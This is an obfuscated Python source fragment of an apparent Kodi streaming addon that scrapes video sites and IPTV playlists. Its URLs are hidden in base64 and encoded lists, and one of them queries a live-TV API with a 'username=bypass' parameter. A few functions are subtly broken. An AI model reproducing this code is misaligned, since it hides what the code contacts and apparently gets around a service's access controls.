   IIIIiI11I11 = 'http://3.bp.blogspot.com/-hofvfBQVexs/UjErIfNdS4I/AAAAAAAAADQ/Q-vVGu3apYU/s1600/corrie.jpg'
   if 'huge' in I1i11i :
    IIi1I ( ( OO0ooOOO0OOO ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , I1i11i . replace ( '\\/' , '/' ) , 8006 , IIIIiI11I11 )
   else :
    pass
    if 50 - 50: iI1Ii11iII1 . oOO - O0 % OOOo0 . I1I1ii
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 17 - 17: O0 + OoooooooOO
def oo0OooO ( ) :
 oO0 = i11iIIIIIi1 ( 'http://uksoapshare.blogspot.co.uk/' )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank">(.+?)</a>' ) . findall ( oO0 )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  if 'Celeb' in OO0ooOOO0OOO :
   IIIIiI11I11 = 'http://3.bp.blogspot.com/-a_yDotWU_pY/VkotKWaG_gI/AAAAAAAAAUk/8Q5iNM6p37k/s1600/iacgoh.jpg'
   if 'huge' in I1i11i :
    IIi1I ( ( OO0ooOOO0OOO ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , I1i11i . replace ( '\\/' , '/' ) , 8006 , IIIIiI11I11 )
   else :
    pass
    if 4 - 4: iI1Ii11iII1 + iIii1I11I1II1 * II1i1IiiIIi11 + Oo * OOooOOo % OoOoOO00
def OO0o0o0oo ( name , url ) :
 iIiII1 = urlresolver . HostedMediaFile ( url ) . valid_url ( )
 if iIiII1 :
  i111iii1I1 = urlresolver . HostedMediaFile ( url ) . resolve ( )
 else :
  IIIII1II = open_url ( url )
  url = re . compile ( 'src="(.+?)"></iframe>' ) . findall ( IIIII1II ) [ 0 ]
  url = url . split ( '?autoplay' ) [ 0 ]
  IIIII1II = open_url ( url )
  iiIiII1 = re . compile ( 'mp4","url":"(.+?)"' ) . findall ( IIIII1II ) [ - 1 ]
  i111iii1I1 = iiIiII1 . replace ( '\\/' , '/' )
 iii11I11iI1 = xbmcgui . ListItem ( name , '' , '' )
 iii11I11iI1 . setPath ( i111iii1I1 )
 xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , iii11I11iI1 )
 if 37 - 37: O0 + oOO * i11i1
 if 27 - 27: O0 . OoOoOO00 + iI1Ii11iII1 % OOooOOo
def oo0O0oOOO0o ( ) :
 IIIII1II = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL3d3dy5kaXppYm94aGQuY29tLw==' ) )
 OoOO0oo0o = re . compile ( 'class="film menu-item menu-item-type-post_type menu-item-object-page menu-item-36980"><a href="(.+?)"><i class="fa fa-film"></i><span>(.+?)</span></a></li>' ) . findall ( IIIII1II )
 II11i1I11Ii1i = re . compile ( 'class="menu-item menu-item-type-post_type menu-item-object-page menu-item-52949"><a href="(.+?)"><i class="fa fa-"></i><span>(.+?)</span></a></li>' ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( 'Diziler' , 'Series' ) , I1i11i , 7071 , ii11iIi1I + 'popcorn.png' )
 for I1i11i , OO0ooOOO0OOO in II11i1I11Ii1i :
  I1111I1II11 ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( 'Filmler' , 'Movies' ) , I1i11i , 7071 , ii11iIi1I + 'popcorn.png' )
  if 70 - 70: Oo % oO0O . ii11ii1ii
def Ii1111iiI ( ) :
 IIIII1II = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL3d3dy5zbmFnZmlsbXMuY29tL2NhdGVnb3JpZXMv' ) )
 OoOO0oo0o = re . compile ( '<a class="nav-item" href="(.+?)">(.+?)</a>' ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  if 'Movies' in OO0ooOOO0OOO :
   I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://www.snagfilms.com' + ( I1i11i ) . replace ( 'http://www.snagfilms.com' , '' ) , 7061 , ii11iIi1I + 'popcorn.png' )
def I1Io0oO0oo ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<a class="object-link size-poster".+?href="(.+?)" data-type="category">.+?src="(.+?)" alt="Image of (.+?)" />' , re . DOTALL ) . findall ( IIIII1II )
 OoOO0oo0o = re . compile ( '<a class="object-link size-poster".+?href="(.+?)" data-type="category">.+?src="(.+?)" alt="Image of (.+?)" />' , re . DOTALL ) . findall ( IIIII1II )
 II11i1I11Ii1i = re . compile ( "<li class='current'>.+?</li><li ><a href='(.+?)'>.+?</a></li><li" , re . DOTALL ) . findall ( IIIII1II )
 for url , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) , 7067 , IIIIiI11I11 )
 for url in II11i1I11Ii1i :
  I1111I1II11 ( '[COLORgreen]NEXT PAGE[/COLOR]' , ( url ) . replace ( '&#038;' , '&' ) , 7063 , ii11iIi1I + 'Next.png' )
  if 98 - 98: OoooooooOO - OOOo0 + oOO
  if 98 - 98: II1i1IiiIIi11 . iI1Ii11iII1 . iI1Ii11iII1 - i11i1
def oOOO0o ( url ) :
 IIIII1II = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL3d3dy5zbmFnZmlsbXMuY29tL2NhdGVnb3JpZXMv' ) )
 OoOO0oo0o = re . compile ( '<a class="object-link size-poster".+?href="(.+?)" data-type="category">.+?src="(.+?)" alt="Image of (.+?)" />' , re . DOTALL ) . findall ( IIIII1II )
 for url , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) , 7062 , IIIIiI11I11 )
  if 18 - 18: ii11ii1ii / Oo - II1i1IiiIIi11
oO000 = '{UJ},' ; oOOO00oOO = '{WE},' ; iiIIiIi = '{WP},' ; O000oO = '{PP},'
def ii11Ii1IiiI1 ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( 'href="(.+?)".+?src="(.+?)" alt="Image of (.+?)"' , re . DOTALL ) . findall ( IIIII1II )
 for url , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( '&#x27;' , '' ) , 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) , 7067 , IIIIiI11I11 )
  if 83 - 83: oOO + i1IIi * OoooooooOO * Ooo0OO0oOO
def OoO0o0OO ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<div class="film-container">.+?<iframe src="(.+?)"' , re . DOTALL ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  II11IiI1 ( 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) )
  if 21 - 21: Ooo00oOo00o
def II11IiI1 ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( 'file: "(.+?)",.+?label: "(.+?)"' , re . DOTALL ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  IIi1I ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 222 , ii11iIi1I + 'popcorn.png' )
  if 63 - 63: OOoo0OO0 . O0 * OOoo0OO0 + iIii1I11I1II1
  if 46 - 46: i1IIi + OoOoOO00 * i1IIi - oO0O
  if 79 - 79: OoOoOO00 - Ooo0OO0oOO * ii11ii1ii - I1IiI . ii11ii1ii
  if 11 - 11: O0 * I1IiI
def IIii1i ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '</h4><p><ul><li><a href="([^"]*)">(.+?)<.+?class=' ) . findall ( IIIII1II )
 II11i1I11Ii1i = re . compile ( '<li><a href="([^"]*)">(.+?)<.+?class=' ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  if '(cooltvseries.com)' in OO0ooOOO0OOO :
   IIi1I ( ( '[COLORgreen]' + OO0ooOOO0OOO + ' -(360)-[/COLOR]' ) . replace ( ' - (cooltvseries.com).mp4' , '' ) , url , 7053 , ii11iIi1I + 'CoolSeries.png' )
 for url , OO0ooOOO0OOO in II11i1I11Ii1i :
  if '(cooltvseries.com)' in OO0ooOOO0OOO :
   IIi1I ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( ' - (cooltvseries.com).mp4' , '' ) , url , 7053 , ii11iIi1I + 'CoolSeries.png' )
def o00oo ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<source type="video/mp4" src="([^"]*)"/>' ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  o00OOo ( ( url ) . replace ( ' ' , '%20' ) )
Ii11IIIi1 = '{XX},' ; ooooooo00oO0OO = '{UD},' ; IIIii11 = '{YT},' ; i1i11I1I1 = '{JS},' ; OOOOOoooO = '{PF},'
if 59 - 59: Ooo0OO0oOO % oOO
def ii1I ( ) :
 IIIII1II = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vc2VjcmV0L2Nsb3VkLnBocA==' ) )
 OoOO0oo0o = re . compile ( '<li class="col-sm-2">.+?<a href="#" class="thumbnail" data-src="(.+?)" data-toggle="modal".+?data-target="#infoModal" name="(.+?)"> <img src="(.+?)" alt=".+?" width="130px"' , re . DOTALL ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO , IIIIiI11I11 in OoOO0oo0o :
  IIi1I ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://stream.cloudtv.bz/stream/channel/20/' + ( i1111 ( I1i11i ) ) , 222 , IIIIiI11I11 )
  if 8 - 8: oO0O + OOOo0 . OOOo0 . I1IiI
def OOOOooO0 ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( 'src="([^"]*)".+?alt=""></a><div class="entry unvoted"><p class="title"><a class="title may-blank " href="([^"]*)" tabindex=.+?>(.+?)</a>' , re . DOTALL ) . findall ( IIIII1II )
 next = re . compile ( '<a href="([^"]*)" rel="nofollow next"' , re . DOTALL ) . findall ( IIIII1II )
 for IIIIiI11I11 , url , OO0ooOOO0OOO in OoOO0oo0o :
  if 'youtu' in url :
   IIi1I ( ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' ) . replace ( '&quot;' , '"' ) . replace ( '&' , ' & ' ) , url , 7051 , 'http:' + IIIIiI11I11 )
 for url in next :
  I1111I1II11 ( '[COLORgreen]NEXT[/COLOR]' , url , 7050 , ii11iIi1I + 'Next.png' )
  if 86 - 86: iI1Ii11iII1
def Iii1I ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( 'rel="shortlink" href="([^"]*)">' , re . DOTALL ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  yt . PlayVideo ( ( url ) . replace ( 'https://youtu.be/' , '' ) )
  if 100 - 100: OoooooooOO . Oo / ii11ii1ii
def I11i1I11iIii ( url ) :
 IIIII1II = i11iIIIIIi1
 OoOO0oo0o = re . compile ( 'id:"(.+?)",url:"(.+?)"' , re . DOTALL ) . findall ( IIIII1II )
 for url , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 222 , IIIIiI11I11 )
  if 81 - 81: oO0O / ii11ii1ii + Ooo0OO0oOO / i11i1 + I1IiI
  if 85 - 85: Oo . i11iIiiIii - i11iIiiIii . OOOo0 . Ooo00oOo00o % OoooooooOO
  if 20 - 20: I1I1ii + I1I1ii * OoOoOO00 * iIii1I11I1II1 % O0 * OOOo0
  if 62 - 62: OoooooooOO / I1IiI . iI1Ii11iII1 . iI1Ii11iII1 % oOO
  if 42 - 42: OOooOOo . i11i1 - oOO
def Iiii ( ) :
 if 56 - 56: OOoo0OO0 - O0 / O0 * i1IIi . OoooooooOO % iIii1I11I1II1
 I1111I1II11 ( 'All Channels' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 I1111I1II11 ( 'Entertainment' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 I1111I1II11 ( 'Movies' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 I1111I1II11 ( 'Music' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 I1111I1II11 ( 'News' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 I1111I1II11 ( 'Sports' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 I1111I1II11 ( 'Documentary' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 I1111I1II11 ( 'Kids' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 I1111I1II11 ( 'Food' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 I1111I1II11 ( 'Religious' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 I1111I1II11 ( 'USA Channels' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 I1111I1II11 ( 'Other' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 if 21 - 21: iI1Ii11iII1 - OOOo0 % OoooooooOO + OOooOOo
 if 92 - 92: oOO + iI1Ii11iII1
def Oooo ( Cat_Name ) :
 if 87 - 87: iI1Ii11iII1 . i1IIi % OoooooooOO * i11iIiiIii
 o0oOo = False
 OoIIiIIIII1I = '0'
 if Cat_Name == 'All Channels' : o0oOo = True
 if Cat_Name == 'Entertainment' : OoIIiIIIII1I = '1'
 if Cat_Name == 'Movies' : OoIIiIIIII1I = '2'
 if Cat_Name == 'Music' : OoIIiIIIII1I = '3'
 if Cat_Name == 'News' : OoIIiIIIII1I = '4'
 if Cat_Name == 'Sports' : OoIIiIIIII1I = '5'
 if Cat_Name == 'Documentary' : OoIIiIIIII1I = '6'
 if Cat_Name == 'Kids' : OoIIiIIIII1I = '7'
 if Cat_Name == 'Food' : OoIIiIIIII1I = '8'
 if Cat_Name == 'Religious' : OoIIiIIIII1I = '9'
 if Cat_Name == 'USA Channels' : OoIIiIIIII1I = '10'
 if Cat_Name == 'Other' : OoIIiIIIII1I = '11'
 if 96 - 96: i11iIiiIii . OoOoOO00
 IIIII1II = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYvRGVzaVN0cmVhbXMvaW5kZXgyMDIucGhwP3RhZz1nZXRfYWxsX2NoYW5uZWwmdXNlcm5hbWU9YnlwYXNz' ) )
 OoOO0oo0o = re . compile ( '"id":".+?","name":"(.+?)","img":"(.+?)","stream_url3":".+?","cat_id":"(.+?)","stream_url2":".+?","stream_url":".+?"}' , re . DOTALL ) . findall ( IIIII1II )
 print 'Len Match: >>>' + str ( len ( OoOO0oo0o ) )
 for OO0ooOOO0OOO , IIIIiI11I11 , i111I111 in OoOO0oo0o :
  I1Iiii = i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYv' ) + ( IIIIiI11I11 ) . replace ( '\\' , '' )
  if i111I111 == OoIIiIIIII1I :
   I1111I1II11 ( OO0ooOOO0OOO , '' , 7022 , I1Iiii )
  elif o0oOo == True :
   I1111I1II11 ( OO0ooOOO0OOO , '' , 7022 , I1Iiii )
  else : pass
  if 7 - 7: i1IIi
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 63 - 63: iIii1I11I1II1 + iI1Ii11iII1 % i1IIi / OOOo0 % OoOoOO00
def OO0 ( Search_Name ) :
 IIIII1II = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYvRGVzaVN0cmVhbXMvaW5kZXgyMDIucGhwP3RhZz1nZXRfYWxsX2NoYW5uZWwmdXNlcm5hbWU9YnlwYXNz' ) )
 OoOO0oo0o = re . compile ( '"id":".+?","name":"' + Search_Name + '","img":"(.+?)","stream_url3":"(.+?)","cat_id":".+?","stream_url2":"(.+?)","stream_url":"(.+?)"}' , re . DOTALL ) . findall ( IIIII1II )
 OoOO0oo0o = re . compile ( '"id":".+?","name":"' + Search_Name + '","img":"(.+?)","stream_url3":"(.+?)","cat_id":".+?","stream_url2":"(.+?)","stream_url":"(.+?)"}' , re . DOTALL ) . findall ( IIIII1II )
 for IIIIiI11I11 , I1i11i , I1III1111iIi , OooOo0oo0O0o00O in OoOO0oo0o :
  I1Iiii = i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYv' ) + ( IIIIiI11I11 ) . replace ( '\\' , '' )
  IIi1I ( Search_Name + ': Link 1' , ( I1i11i ) . replace ( '\\' , '' ) , 222 , I1Iiii )
  IIi1I ( Search_Name + ': Link 2' , ( I1III1111iIi ) . replace ( '\\' , '' ) , 222 , I1Iiii )
  IIi1I ( Search_Name + ': Link 3' , ( OooOo0oo0O0o00O ) . replace ( '\\' , '' ) , 222 , I1Iiii )
  if 48 - 48: i1IIi * OOOo0
def iiiIIiii11I1 ( ) :
 IIIII1II = i11iIIIIIi1 ( i1111 ( oo ( 0 , [ 97 ] , [ 221 , 72 , 245 , 82 , 68 , 48 , 242 , 99 , 143 , 68 , 9 , 111 , 24 , 118 , 180 , 76 , 29 , 51 , 14 , 100 , 187 , 51 , 105 , 100 , 106 , 121 , 52 , 53 , 240 , 114 , 26 , 98 , 252 , 50 , 197 , 82 , 218 , 112 , 19 , 99 , 94 , 71 , 54 , 120 , 104 , 108 , 174 , 101 , 107 , 72 , 168 , 82 , 191 , 50 , 88 , 76 , 90 , 109 , 138 , 78 , 24 , 118 , 89 , 76 , 218 , 110 , 231 , 86 , 105 , 114 , 252 , 76 , 37 , 50 , 36 , 82 , 96 , 118 , 27 , 100 , 120 , 50 , 160 , 53 , 72 , 115 , 200 , 98 , 80 , 50 , 201 , 70 , 114 , 107 , 9 , 99 , 113 , 121 , 127 , 57 , 155 , 106 , 213 , 97 , 194 , 71 , 192 , 70 , 162 , 116 , 27 , 99 , 46 , 71 , 191 , 108 , 4 , 118 , 24 , 98 , 27 , 109 , 105 , 108 , 89 , 119 , 164 , 100 , 88 , 72 , 237 , 89 , 93 , 117 , 40 , 98 , 211 , 84 , 75 , 78 , 216 , 49 ] ) ) )
 OoOO0oo0o = re . compile ( '#EXTINF:-1,(.+)\s*(.+)\s*' ) . findall ( IIIII1II )
 for OO0ooOOO0OOO , I1i11i in OoOO0oo0o :
  IIi1I ( OO0ooOOO0OOO , ( I1i11i ) . replace ( '"' , ' ' ) . replace ( '&' , '&' ) . strip ( ) + '|connection=keep-alive' , 222 , ii11iIi1I + 'english.png' )
def oo0O ( ) :
 IIIII1II = i11iIIIIIi1 ( i1111 ( oo ( 0 , [ 97 ] , [ 221 , 72 , 245 , 82 , 68 , 48 , 242 , 99 , 143 , 68 , 9 , 111 , 24 , 118 , 180 , 76 , 29 , 51 , 14 , 100 , 187 , 51 , 105 , 100 , 106 , 121 , 52 , 53 , 240 , 114 , 26 , 98 , 252 , 50 , 197 , 82 , 218 , 112 , 19 , 99 , 94 , 71 , 54 , 120 , 104 , 108 , 174 , 101 , 107 , 72 , 168 , 82 , 191 , 50 , 88 , 76 , 90 , 109 , 138 , 78 , 24 , 118 , 89 , 76 , 218 , 110 , 231 , 86 , 105 , 114 , 252 , 76 , 37 , 50 , 36 , 82 , 96 , 118 , 27 , 100 , 120 , 50 , 160 , 53 , 72 , 115 , 200 , 98 , 80 , 50 , 201 , 70 , 114 , 107 , 9 , 99 , 113 , 121 , 127 , 57 , 155 , 106 , 213 , 97 , 194 , 71 , 192 , 70 , 162 , 116 , 27 , 99 , 46 , 71 , 191 , 108 , 4 , 118 , 24 , 98 , 27 , 109 , 105 , 108 , 89 , 119 , 164 , 100 , 88 , 72 , 237 , 89 , 93 , 117 , 40 , 98 , 211 , 84 , 75 , 78 , 216 , 49 ] ) ) )
 OoOO0oo0o = re . compile ( '#EXTINF:-2,(.+)\s*(.+)\s*' ) . findall ( IIIII1II )
 for OO0ooOOO0OOO , I1i11i in OoOO0oo0o :
  IIi1I ( OO0ooOOO0OOO , ( I1i11i ) . replace ( '"' , ' ' ) . replace ( '&' , '&' ) . strip ( ) , 222 , ii11iIi1I + 'xxx.png' )
def Ooooo0O0 ( ) :
 IIIII1II = i11iIIIIIi1 ( i1111 ( oo ( 0 , [ 97 , 129 , 72 , 149 , 82 , 100 , 48 , 63 , 99 , 170 , 68 , 159 , 111 , 42 , 118 , 83 , 76 , 128 , 51 , 61 , 100 , 44 , 51 , 201 , 100 , 148 , 121 , 134 , 53 ] , [ 159 , 114 , 70 , 98 , 144 , 50 , 37 , 82 , 253 , 112 , 184 , 99 , 50 , 71 , 154 , 120 , 110 , 108 , 179 , 101 , 250 , 72 , 65 , 82 , 125 , 50 , 52 , 76 , 28 , 109 , 124 , 78 , 191 , 118 , 193 , 76 , 193 , 110 , 145 , 86 , 92 , 114 , 193 , 76 , 41 , 50 , 82 , 82 , 206 , 118 , 32 , 100 , 163 , 50 , 209 , 53 , 191 , 115 , 42 , 98 , 30 , 50 , 237 , 70 , 26 , 107 , 70 , 99 , 64 , 121 , 115 , 57 , 230 , 116 , 32 , 97 , 39 , 88 , 58 , 104 , 38 , 50 , 77 , 98 , 185 , 50 , 86 , 81 , 80 , 117 , 111 , 98 , 226 , 84 , 75 , 78 , 210 , 49 ] ) ) )
 OoOO0oo0o = re . compile ( '#EXTINF:.+?,(.+)\s*(.+)\s*' ) . findall ( IIIII1II )
 for OO0ooOOO0OOO , I1i11i in OoOO0oo0o :
  IIi1I ( OO0ooOOO0OOO , ( I1i11i ) . replace ( '"' , ' ' ) . replace ( '&' , '&' ) . strip ( ) , 222 , ii11iIi1I + 'vod(1).png' )
  if 99 - 99: Oo + i11iIiiIii
def I111Ii11i11I ( url ) :
 url
 i11IoO0000O0Oo00O = xbmcgui . ListItem ( OO0ooOOO0OOO , path = url )
 xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , i11IoO0000O0Oo00O )
 return
 if 42 - 42: i11iIiiIii / OOOo0 - Ooo00oOo00o - oOO + OoOoOO00 % oOO
 if 50 - 50: OoooooooOO + Ooo0OO0oOO * OOOo0 - oO0O / i11iIiiIii
def iiiIIiiIi ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<a class=.+?href="(.+?)">.+?<div class="videothumboverlay hidden-xs" id=".+?">(.+?)</div>.+?<div class="videothumbbox"><img src="(.+?)" class="videothumb" alt="(.+?)"></div>' , re . DOTALL ) . findall ( IIIII1II )
 II11i1I11Ii1i = re . compile ( "<a href='(.+?)' class='paginationnext'>Next &raquo;</a></div>" ) . findall ( IIIII1II )
 for url , oOoO00o , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , 'https://www.fitnessblender.com' + url , 7086 , 'https://www.fitnessblender.com' + IIIIiI11I11 , '' , ( oOoO00o ) . replace ( '</p>' , ' ' ) . replace ( '<p>' , ' ' ) )
  Oo0oO ( 'tvshows' , 'Media Info 3' )
 for url in II11i1I11Ii1i :
  I1111I1II11 ( 'NEXT' , 'https://www.fitnessblender.com' + url , 7085 , ii11iIi1I + 'Next.png' )
  if 86 - 86: OoooooooOO % OoOoOO00 . OoooooooOO * ii11ii1ii
def iI1II1i ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<div class=\'videowrapper\'>.+?src="//www.youtube.com/embed/(.+?)?rel=0&amp;wmode=transparent" frameborder="0"></iframe></div>.+?<h3 class="videodetailheader">(.+?)</h3>.+?<p class="videodetailvalue"><img src=\'(.+?)\'/></p>' , re . DOTALL ) . findall ( oO0 )
 for url , oOoO00o , IIIIiI11I11 in OoOO0oo0o :
  ooo00OOOooO ( 'PLAY' , url , 8043 , 'https://www.fitnessblender.com' + IIIIiI11I11 , '' , oOoO00o )
  Oo0oO ( 'tvshows' , 'Media Info 3' )
 OoOOOO = re . compile ( '<h2 class="videodetailheader">Workout Details</h2>(.+?)</div>' , re . DOTALL ) . findall ( oO0 )
 for iI1iI in OoOOOO :
  oOo = ( iI1iI ) . replace ( '<p>' , '' ) . replace ( '</p>' , '' ) . replace ( '<br />' , '' ) . replace ( '&nbsp;' , '' ) . replace ( '<strong>' , '' ) . replace ( '</strong>' , '' ) . replace ( '"' , '' ) . replace ( '<' , '' ) . replace ( '>' , '' ) . replace ( 'a href' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&rsquo;t' , '' ) . replace ( '&' , '&' )
  O00OOOoOoo0O ( 'INFO' , '' , 7087 , 'https://www.fitnessblender.com' + IIIIiI11I11 , '' , oOo )
  if 9 - 9: OOooOOo - iI1Ii11iII1 + iIii1I11I1II1 + Ooo00oOo00o
def IIIIIiI1I1 ( INFO ) :
 ooO00OO0 ( 'info for workout' , INFO )
 if 62 - 62: OOooOOo / iIii1I11I1II1
 if 55 - 55: oO0O / Ooo00oOo00o + II1i1IiiIIi11 . iI1Ii11iII1
 if 47 - 47: O0
def OooOoo ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( 'cat-item-.+?"><a href="(.+?)" >(.+?)</a>' ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , url , 9031 , ii11iIi1I + 'icon.png' )
def Oooo0Oo00o ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" title=".+?" rel="bookmark"><time class="entry-date published updated" datetime=".+?">(.+?)</time></a>' ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , url , 9032 , ii11iIi1I + 'icon.png' )
def IIoO ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '#EXTINF:-.+?,(.+)\s*(.+)\s*' ) . findall ( IIIII1II )
 for OO0ooOOO0OOO , url in OoOO0oo0o :
  if '://' in OO0ooOOO0OOO :
   pass
   IIi1I ( ( OO0ooOOO0OOO ) . replace ( '<br />' , '' ) , ( url ) . replace ( '<br />' , '' ) , 222 , ii11iIi1I + 'icon.png' )
def iI1I ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( 'EXTINF:-.+?,(.+)</div></li><li class=".+?"><div class=".+?">(.+?)</div>).findall' ) . findall ( IIIII1II )
 for OO0ooOOO0OOO , url in OoOO0oo0o :
  IIi1I ( OO0ooOOO0OOO , url , 222 , ii11iIi1I + 'icon.png' )
  if 6 - 6: Ooo00oOo00o
  if 99 - 99: OOooOOo * i11i1 % Ooo0OO0oOO * Ooo0OO0oOO + OoooooooOO
  if 82 - 82: OOoo0OO0 / I1IiI - i11i1 / oOO
def I1iIIi ( ) :
 IIIII1II = i11iIIIIIi1 ( 'http://www.disclose.tv/action/videolist/aliens/page/1/all/channel/1/category/1/' )
 OoOO0oo0o = re . compile ( '<li><a href="([^"]*)">(.+?)</a></li>' ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , 'http://www.disclose.tv/' + I1i11i , 7010 , ii11iIi1I + 'disclose.png' )
  if 46 - 46: OOOo0 . iI1Ii11iII1 - i11iIiiIii - I1I1ii
  if 97 - 97: OoOoOO00 % Oo * iI1Ii11iII1
def oOoOO0O00o ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( 'href="([^"]*)"><img width="135" height="76" alt="([^"]*)".+?src="([^"]*)" />' , re . DOTALL ) . findall ( IIIII1II )
 next = re . compile ( '<link rel="next" href="([^"]*)" />' ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO , IIIIiI11I11 in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , 'http://www.disclose.tv/' + url , 7011 , IIIIiI11I11 )
 for url in next :
  I1111I1II11 ( 'NEXT' , url , 7010 , ii11iIi1I + 'Next.png' )
  if 77 - 77: I1I1ii + Ooo0OO0oOO
  if 38 - 38: ii11ii1ii - oO0O * OOooOOo
def iIIIi1iii1I11 ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( 'url: "([^"]*)",' , re . DOTALL ) . findall ( IIIII1II )
 II11i1I11Ii1i = re . compile ( "src='([^']*)' type='([^']*)' />" , re . DOTALL ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  if 'http' in url :
   IIi1I ( 'video/flv' , url , 222 , ii11iIi1I + 'disclose.png' )
 for url , OO0ooOOO0OOO in II11i1I11Ii1i :
  IIi1I ( OO0ooOOO0OOO , url , 222 , ii11iIi1I + 'disclose.png' )
